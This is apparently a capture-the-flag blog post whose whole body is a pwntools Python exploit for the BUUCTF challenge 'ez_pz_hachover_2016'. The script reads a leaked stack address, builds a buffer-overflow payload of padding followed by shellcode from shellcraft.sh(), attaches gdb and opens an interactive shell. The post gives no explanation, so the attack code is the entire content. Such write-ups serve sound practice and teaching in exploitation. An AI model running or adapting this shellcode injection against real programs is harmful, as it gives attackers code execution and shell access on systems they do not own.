+++
title = "exp1"
date = "2026-03-04"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-1', '2-1-2', 'ez_pz_hachover_2016']
draft = false
+++
```python
from pwn import *  
  
  
#context(arch='i386', os='linux', log_level='debug')  
  
io = process('./pwn')             # 在本地运行程序。  
# gdb.attach(io)                    # 启动 GDB#io = connect('node5.buuoj.cn',29907 )  # 与在线环境交互。  
  
offset = 0x16 + 0x04 - 0x08  
vuln_addr = 0x08048603  
  
elf = ELF("./pwn")  
io.recvuntil(b'Yippie, lets crash: ')  
s_addr = int(io.recvline().strip(),16)  
print(hex(s_addr))  
  
shellcode=asm(shellcraft.sh())  
io.recvline()  
io.recvuntil(b'> ')  
payload=b'crashme\x00'  
payload += b'a' * offset + p32(0) + shellcode  
  
break_addr = 0x8048600  
gdb_script = f"""  
    b *{break_addr}  
    c    """  
gdb.attach(io, gdbscript=gdb_script)  
io.sendline(payload)  
  
io.interactive()
```
